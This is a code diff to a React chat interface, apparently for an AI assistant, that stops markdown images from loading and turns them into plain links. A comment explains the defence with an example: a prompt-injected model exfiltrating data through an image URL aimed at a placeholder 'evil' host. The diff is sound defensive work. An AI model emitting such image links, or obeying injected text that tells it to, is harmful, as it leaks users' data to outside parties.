@@ -1,5 +1,5 @@
 import { useEffect, useRef, useState } from "react";
-import Markdown from "react-markdown";
+import Markdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { api, type ConnStatus } from "./api";
 import { Badge } from "./App";
@@ -57,7 +57,13 @@ export function Chat({ sid, state, conn, onError, onToggleFiles }: Props) {
   );
 }
 
-const Md = ({ text }: { text: string }) => <div className="md"><Markdown remarkPlugins={[remarkGfm]}>{text}</Markdown></div>;
+// Images are never loaded: a prompt-injected model could leak data via ![](https://evil/?d=...). javascript: URLs are
+// dropped by react-markdown's default urlTransform.
+const mdComponents: Components = {
+  img: ({ src, alt }) => <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noopener noreferrer">[image: {alt}] {src}</a>,
+  a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>,
+};
+export const Md = ({ text }: { text: string }) => <div className="md"><Markdown remarkPlugins={[remarkGfm]} components={mdComponents}>{text}</Markdown></div>;
 
 function Thinking({ text, open }: { text: string; open?: boolean }) {
   return <details className="thinking" open={open}><summary>Thinking</summary><div>{text}</div></details>;
